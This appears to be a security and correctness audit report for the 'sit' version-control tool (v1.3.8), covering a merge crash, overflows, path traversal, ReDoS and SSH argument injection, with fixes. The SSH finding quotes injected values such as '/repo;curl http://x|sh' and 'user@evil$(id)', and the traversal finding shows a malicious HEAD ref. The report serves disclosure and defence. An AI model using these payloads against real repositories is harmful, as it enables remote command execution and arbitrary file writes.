# Security + correctness audit — 2026-08-18 (v1.3.8)

A second, deeper pass over the whole tree, run immediately after the v1.3.7
hardening release. Where 1.3.7 was a single-reviewer sweep that concentrated on
the newest parser, this one fanned **10 independent auditors** across every
module cluster and cross-cutting bug class, then put **every** finding through
three adversarial verifiers (exploitability / control-flow / already-guarded)
with a majority-refute kill rule, and finished with a completeness critic.

119 agents, 36 candidate findings, 29 surviving verification, 4 more from the
critic. After de-duplication (two pairs were the same defect found from
different angles) that is **~26 unique findings**.

**Headline: the worst defect in this release is not a security bug at all.**
`sit merge` SIGSEGV'd on one side appending a line while the other prepended
one — an everyday merge, no hostile input, no attacker. It had been shipping
since the three-way merge landed. The security findings are real and are fixed,
but the audit's most valuable outcome was a basic correctness failure that a
single ordinary merge would hit.

### 1 — CRITICAL: `three_way_line_merge` never terminates on an insert-only hunk

`src/merge.cyr`. A hunk is `{base_start, base_end, inserts}` — "replace
`base[start,end)` with `inserts`". An **insert-only** hunk has
`base_start == base_end`. The walk did:

```
b = load64(oh + 8);     # unconditionally take the hunk's base_end
```

For a pure insert that assigns `b` to itself. `hunk_starting_at(hunks, b)` then
re-found the identical hunk on the next iteration and re-appended its lines,
forever — and `append_line_to_buf` had **no capacity argument at all**, so it
memcpy'd file bytes past the `base_len + ours_len + theirs_len + 64` allocation
until it reached an unmapped page.

Reproduced with a merge anyone could perform:

```bash
# base:  a, b
# ours:  a, b, X1      (append)
# theirs: Z0, a, b     (prepend)
sit merge other        # -> SIGSEGV (exit 139, core dumped)
```

**Fix**, two parts:
- Only take a hunk's `base_end` when it actually **consumes** base lines
  (`if (oend > b)`). A pure insert emits its lines and leaves `b` alone, so the
  base line at `b` is still emitted and `b` advances by one — which is the
  correct semantics for "insert before base line b" anyway. Both sides' hunks
  are now considered at the same position instead of the second being dropped.
- `append_line_to_buf` takes a capacity and returns `(0 - 1)` rather than
  writing past it; the caller aborts the merge to a conflict. Any future
  sizing miscount now fails closed instead of corrupting the heap.

The merge now succeeds **and produces the correct result** — `Z0 a b X1`,
matching git. It was previously not merely crashing but, on the paths that
survived, silently dropping one side's edits.

### 2 — HIGH: remote `Content-Length` overflows the completeness test

`src/wire_http.cyr`, `src/wire_ssh.cyr`. The idiomatic framing test is
`used >= body_off + content_len`. With a `Content-Length` near i64 max that sum
wraps **negative**, so the test passes on the first iteration and the client
returns a "complete" response whose body it never read — then uses the bogus
length. Neither client bounded the header value.

**Fix**: a shared `content_length_sane(v, max)` in `util.cyr`, applied at every
site (both clients plus the `serve` endpoints), rejecting negatives and anything
past the 16 MiB cap so the failure modes line up across transports.

### 3 — HIGH: `ssh://` argument and remote-command injection

`src/wire_ssh.cyr`. `_ssh_parse_url`'s header comment promised three defences,
the third being "whitelisting allowed bytes in user / host / repo-path via
`url_authority_path_valid`". **It never called it.** The only checks were three
leading-`-` tests. `do_fetch` / `cmd_push` read the remote URL straight out of
`.sit/config` with a scheme check only, so `remote_url_valid` — the sole
whitelist enforcer, applied by `clone` and `remote add` — was bypassed entirely
for any repo whose config arrived from outside.

Captured from the pre-fix build with a fake `ssh` on `$PATH`:

```
FAKE-SSH ARGV: [-T] [--] [user@evil$(id)] [sit] [serve] [/repo;curl http://x|sh] [--stdio]
```

The `--` sentinel stops ssh's own option parsing but not (a) OpenSSH joining the
trailing argv into **one string run by the remote login shell** — remote command
execution on an otherwise-legitimate server — or (b) `%h`/`%r` percent-expansion
of the hostname into `ProxyCommand`/`LocalCommand`, which is handed to `/bin/sh`
(CVE-2023-51385 class).

**Fix**: actually apply `url_authority_path_valid` to user, host and repo path,
and additionally reject `%` in user/host (percent-expansion is a client-side
`/bin/sh` path; `%` stays legal in the repo path, where it is ordinary
percent-encoding). Post-fix the URL is rejected at parse.

### 4 — HIGH: HEAD symref path traversal → arbitrary file write

`src/refs.cyr`. `read_head_ref_path()` returned the raw bytes after `ref: ` with
no validation, and `write_head_ref` / `reflog_head_move` concatenate that value
onto `".sit/"` / `".sit/logs/"` to form **write** paths.

Verified end to end: with `.sit/HEAD` = `ref: ../../PWNED`, `sit commit` wrote 65
bytes to a file outside the repository. `refs/heads/../../../../home/u/.bashrc`
additionally passes the `memeq("refs/heads/", 11)` test in `reflog_head_move`,
appending reflog lines — which carry the user's commit message — onto that path.

Reachable from any repo whose `.sit/` arrived from outside: tarball, shared
checkout, restored backup, CI workspace. git blocks the identical shape via
`check_refname_format()` on the referent.

**Fix**: validate with `refname_valid` inside `read_head_ref_path` — the single
choke point feeding the read path, the write path and the reflog, and shared by
the `.git/` backend through `_git_read_head_ref`.

### 5 — HIGH: `serve --stdio` dispatches on a length it never received

`src/serve.cyr`. `req_end = bo + clen` was computed from the client's claimed
`Content-Length` and passed as `n` to `serve_handle_request`. Since
`_stdio_recv_request` returns at most 64 KiB and never loops to complete an
oversized body, every POST handler's completeness check —
`if (body_off + clen > n)` — became the tautology `X > X` and never fired.
`serve_handle_put_object` then handed that claimed length (up to 16 MiB) to
`zlib_decompress` over a 64 KiB buffer.

**Fix**: bound the claimed length, then refuse when `req_end > n` — a body that
was never received is a truncated request, not a short one.

### 6 — HIGH: `_wildmatch` catastrophic backtracking

`src/index.cyr`. An unmemoized backtracking matcher: every `*` branches into
"match empty" and "consume one byte", so k star-groups explore exponentially
many states. `_GLOB_PAT_MAX = 256` does not bound it — eight stars suffice.

An **eighteen-byte** `.sitignore` (`*a*a*a*a*a*a*a*a*b`) plus a 64-char filename
pinned a core indefinitely: `sit status` ran at 100% CPU past a 15 s timeout.
The same matcher serves `.gitignore` on the `sit_repo_status` path owl and thoth
call against untrusted repos.

**Fix**: a per-match step budget (`_GLOB_STEP_MAX = 200000`). Exhaustion returns
"no match", the safe direction for ignore matching — the file is reported rather
than silently hidden. 15 s hang → 4 ms.

⚠ **Honest limit**: this bounds the *resource*, it does not make the matcher
polynomial. The algorithm is still worst-case exponential; it simply cannot
spend more than the budget proving it. The proper fix is memoization over
(pattern offset, string offset), not taken here because the memo table would
have to be allocated and zeroed per (pattern, path) pair on the `is_ignored` hot
path, which is a measured benchmark (`is_ignored-200pat`). Tracked on the
roadmap.

### 7 — HIGH: `config_file_set` heap overflow on duplicate keys

`src/config.cyr`. `out` was sized `len + key_len + val_len + 8`, assuming the key
occurs **once** — but the rewrite loop replaces **every** matching line.

Measured: a config of 2000 short duplicate lines plus a 1000-byte value wrote
**2,010,007 bytes into a 9,016-byte allocation**. It exited 0; it faulted only if
the bump allocator happened to be short of mapped slack.

**Fix**: count the matches first, then size for all of them.

### 8–11 — HIGH: four unbounded walks

- **Commit timestamp** (`commit.cyr`): the author timestamp went straight into
  `iso8601`, whose stdlib `epoch_to_date` walks forward from 1970 **one year per
  iteration**. A crafted timestamp is tens of billions of iterations. Clamped to
  `SIT_TS_MAX` (9999-12-31T23:59:59Z) — which is also the largest value the
  formatter's four-digit year field can render, so the clamp is the formatter's
  real domain rather than an arbitrary cutoff.
- **`cmd_log` parent walk** (`commit.cyr`): no cycle bound. Objects are
  content-addressed so a genuine hash cycle is infeasible to forge, but sit does
  not re-verify an object's hash on **read** (that is fsck's job), so a
  hand-authored `objects.patra` can store a commit whose body names itself as
  parent. Bounded by `SIT_MAX_COMMIT_WALK`.
- **`flatten_tree`** (`tree.cyr`): S-14 capped depth but not **node count**. A
  tree naming the same subtree N times per level expands to Nᵏ paths from a
  few hundred KB of repository; depth 256 is never reached because memory is
  exhausted first. Added a node budget with an explicit reset at each of the
  three external entry points.
- **Worktree walk** (`diff.cyr`): `is_dir` follows symlinks, so a symlinked
  directory pointing at an ancestor recursed to the kernel's 40-deep `ELOOP` cap,
  emitting `d/loop/d/loop/...` and allocating a path per level. Fixed by not
  descending symlinks — which is also the **correct** semantics: git records a
  symlink as a symlink blob and never traverses it.

### 12 — MEDIUM: unvalidated object ids reach a SQL literal

`read_object` memcpy'd 64 bytes of `hex` verbatim into a patra SQL string
literal with no validation, and `hex` arrives there from a dozen places —
commit `tree`/`parent` header fields, tree entry hashes, ref files, the reflog,
wire responses — several with no gate of their own. The unconditional 64-byte
copy also made a shorter string an out-of-bounds read.

**Fix**: gate at the choke point (`hex_prefix_valid` in `read_object`), which
covers every caller at once rather than patching each site.

### 13 — MEDIUM: `.git/config` hash-algo detection is an unanchored scan

`_git_detect_hash_algo` scanned the **whole file** for the bytes `sha256`,
justified in-source by "the token appears nowhere else in a normal config". That
is false. Any occurrence — a remote URL, a branch or submodule name, an alias —
flips a SHA-1 repo into 64-hex mode, after which every width gate rejects and
`read_head_ref` returns 0.

The failure is silent and **fails open at the reporting layer**:
`sit_repo_open` still returns 1 and `sit_repo_branch` still returns the correct
name, but `sit_repo_status` reports a clean tree as **all files untracked**.
owl/thoth get a confident wrong answer rather than an error.

It is attacker-reachable, not just a user footgun: a submodule **name** chosen in
the attacker's `.gitmodules` is copied verbatim into the superproject's
`.git/config` by `git submodule update --init`.

**Fix**: anchor to the `objectFormat` **key** (case-insensitive, free-form
spacing, value must be exactly `sha256`). Section headers and other keys' values
no longer match.

## Deferred to 1.3.9

Fixed here: every CRITICAL and HIGH, plus four MEDIUMs. The following confirmed
MEDIUM/LOW findings are **not** fixed in this release and are on the roadmap.
None is a memory-safety defect:

- `object_db.cyr` — `fsck --prune-now` can delete reachable objects when
  `parse_tree` silently drops a malformed entry (MEDIUM; needs the drop to
  become visible to the walk rather than silent).
- `refs.cyr` — `sit_repo_branch` returns raw unsanitized `.git/HEAD` bytes
  (control/ANSI) to owl and thoth (MEDIUM; consumer-side terminal injection).
- `wire.cyr` — commit-chain walk has no depth or object cap, so a remote can
  drive unbounded never-freed allocation (MEDIUM); and object ids from commit
  bodies are interpolated into the *remote-handle* SQL path, which does not go
  through the `read_object` gate added here (MEDIUM).
- `diff.cyr` — `lcs_diff`'s per-dimension guard fires before the cell-count
  check, so any add/delete of a >8192-line file refuses to diff (MEDIUM,
  functional); `group_hunks` signed overflow of `2 * ctx` (LOW); `-U0` emits one
  spurious leading context line per hunk after the first (LOW).
- `config.cyr` — config values echoed to the terminal without control-char
  sanitization (LOW).
- `merge.cyr` — `read_merge_head` returns 64 unvalidated bytes (LOW, now largely
  mitigated by the `read_object` gate); auto-merged worktree writes ignored on
  the conflict path (LOW).
- `wire_ssh.cyr` — `ssh_remote_read_raw` omits the hex/type validation its HTTP
  sibling performs (LOW).
- `api.cyr` — `sit_repo_open` detects the backend before setting the repo root
  (MEDIUM, from the critic).
- `git_pack.cyr` — two raw `is_dir()` calls bypass the `sit_abs` repo-root seam
  (MEDIUM, from the critic; AGNOS-relevant).

## Result

Eleven CRITICAL/HIGH defects fixed, four MEDIUMs, ten deferred and named. The
1.3.7 audit's lesson was that the unfuzzed module held the bugs. This one's is
narrower and sharper: **1.3.7 reviewed the code that looked dangerous, and the
worst defect was in the code that looked boring.** A three-way merge of two
one-line edits crashed the program, and no amount of staring at parsers would
have found it — it took someone actually running an ordinary merge.
